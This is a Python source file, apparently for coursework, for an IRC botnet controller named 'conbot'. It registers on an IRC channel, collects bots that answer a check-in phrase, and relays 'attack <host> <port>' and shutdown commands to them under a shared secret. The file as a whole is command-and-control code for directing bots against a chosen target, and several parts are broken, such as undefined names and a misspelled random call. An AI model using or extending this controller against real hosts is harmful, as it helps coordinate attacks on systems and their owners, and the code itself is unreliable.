import sys
import socket
import time
import threading
import traceback


class colors:
    OAKGREEN = '\033[92m'
    BLUE = '\033[1;34m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'


def eprint(*args, **kwargs):
    print(*args, file=sys.stderr, **kwargs)

    
class ConBot:
    def __init__(self, server, name, channel, port, secret):
        self._server = server
        #need to generate nick
        self._nick = name
        self._channel = '#' + channel
        self._port = port        
        self._secret = secret
        self._running = True
        self._bots = []

        self._socket = socket.socket()
        self._socket.settimeout(5)
        self._socket.connect((server, port))

    def parsemsg(self, s):
        """Breaks a message from an IRC server into its prefix, command, and arguments.
        """
        prefix = ''
        trailing = []
        if not s:
            raise IRCBadMessage("Empty line.")
        if s[0] == ':':
            prefix, s = s[1:].split(' ', 1)
        if s.find(' :') != -1:
            s, trailing = s.split(' :', 1)
            args = s.split()
            args.append(trailing)
        else:
            args = s.split()

        command = args.pop(0)

        return prefix, command, args

    def logSend(self, msg):
        msg = bytes(msg)
        eprint("--> sending: {0}{1}{2}".format(colors.BLUE, str(msg), colors.ENDC))
        self._socket.send(msg)

    def logRecv(self):
        response = self._socket.recv(1024).decode("utf-8")
        eprint("<-- received: {0}{1}{2}".format(colors.WARNING, response, colors.ENDC))
        responses = response.split("\r\n")
        return responses[:len(responses) - 1]

    def initConnection(self):
        """ attempts to register with the server with specified nickname.o """
        self.logSend("NICK {}\r\n".format(self._nick).encode("utf-8"))
        self.logSend("USER {0} 0 * :{1}\r\n".format(self._nick, self._nick).encode("utf-8"))
        
    def debugLogResponse(self, prefix, command, args):
        """ """
        eprint("prefix: {0}".format(prefix))
        eprint("command: {0}".format(command))
        eprint("args: {0}".format(args))

    def doWork(self):
        """ """
        try:
            self.initConnection()

            responses = self.logRecv()
            while self._running or len(responses) > 0:
                for response in responses:
                    prefix, command, args = self.parsemsg(response)

                    self.debugLogResponse(prefix, command, args)
                
                    if command == "PING":
                        self.logSend("PONG {}\r\n".format(args[0]).encode("utf-8"))
                    elif command == "004":
                        #registration complete join channel
                        self.logSend("JOIN {}\r\n".format(self._channel).encode("utf-8"))
                    elif command == "433":
                        #username taken
                        self._nick = self._nick + str(randomint(1, 10))
                        self.initConnection()
                    elif command == "QUIT":
                        #TODO check if it was one of our bots and remove from bot list
                        pass
                    elif command == "PRIVMSG":
                        sender = prefix[:prefix.index("!")]
                        channel = args[0]
                        msg = args[1]

                        if msg == "what is my purpose?":
                            if not self.knownBot(sender):
                                self._bots.append(sender)
                            
                try:
                    responses = self.logRecv()
                except socket.timeout:
                    responses = []
                    #do nothing, if we were shutdown - running is set to false
                    #otherwise it was a normal socket read timeout to prevent locking
                    pass
                    
        except:
            eprint("!! response loop ending")
            eprint(traceback.format_exc())


    def knownBot(self, botName):
        for bot in self._bots:
            if bot == botName:
                return True

        return False

    def attack(self, commandParts):
        """ handles attack command """
        if len(self._bots) == 0:
            print("!! No known bots. Use the [status] command to find bots")
        else:
            if len(commandParts) != 3:
                print("Invalid command syntax. Syntax is attack <host> <port>")
            else:
                try:
                    command = commandParts[0]
                    host = commandParts[1]
                    port = int(commandParts[2])
                    
                    for bot in self._bots:
                        msg = "PRIVMSG {0} :{1} {2} {3} {4}\r\n".format(bot, secret, command, host, port).encode('utf-8')
                        self.logSend(msg)

                except ValueError:
                    print("Invalid port number. Must be between 1 and 65535.")

    '''
    def shutdown(self, command):
       
    '''
            
                                                               
    def status(self):
        self._bots = []
        msg = "PRIVMSG {0} :{1}\r\n".format(self._channel, "heyyy what up mah glip glops?").encode('utf-8')
        self.logSend(msg)
        print("Waiting for bot responses...")        
        time.sleep(.5)

        print("{0}Found {1} bots.{2}".format(colors.BLUE, len(self._bots), colors.ENDC))
        for bot in self._bots:
            print("{0}{1}{2}".format(colors.WARNING, bot, colors.ENDC))

    def quit(self):
        self._running = False
        self._socket.send("QUIT\r\n".encode("utf-8"))
            
    def shutdown(self, command):
        for bot in self._bots:
            msg = "PRIVMSG {0} :{1} {2}\r\n".format(bot, secret, command).encode('utf-8')
            self.logSend(msg)

        
    def __del__(self):
        try:
            self._socket.close()
        finally:
            eprint("Controller shutting down.")

def handleCommands(controller):
    """
    
    """

    print("Enter command: ", end = '')
    sys.stdout.flush()
    command = sys.stdin.readline()
    while command != '':
        command = command.strip("\r\n")
        commandParts = command.split()

        if commandParts[0] == "status":
            print("status!")
            controller.status()
        elif commandParts[0] == "attack":
            print("attack!")
            controller.attack(commandParts)                                                           
        elif commandParts[0] == "quit":
            controller.quit()
            break;
        elif commandParts[0] == "shutdown":
            print("shutdown!")
            controller.shutdown(commandParts[0])
            break;
        else:
            print("Invalid command!");
            
        print("Enter command: ", end = '')
        sys.stdout.flush()
        command=sys.stdin.readline()
    

if __name__ == "__main__":

    if len(sys.argv) != 5:
        eprint("Invalid usage. Usage: ")
        eprint("python3 conbot.py <hostname> <port> <channel> <secret-phrase>")
    else:
        try:
            host = sys.argv[1]
            name = "leeroy_jenkins"
            port = int(sys.argv[2])
            chan = sys.argv[3]
            secret = sys.argv[4]

            controller = ConBot(host, "leeroy_jenkins", chan, port, secret)
            conbot = threading.Thread(target=controller.doWork, args=())
            conbot.start()

            handleCommands(controller)

            print(conbot.isAlive())
            
            conbot.join()
        except ValueError:
            eprint("Invalid port number. Port must be from 1-65535")
        except:
            eprint("An error occured. Please ensure valid parameters")
            eprint(traceback.format_exc())

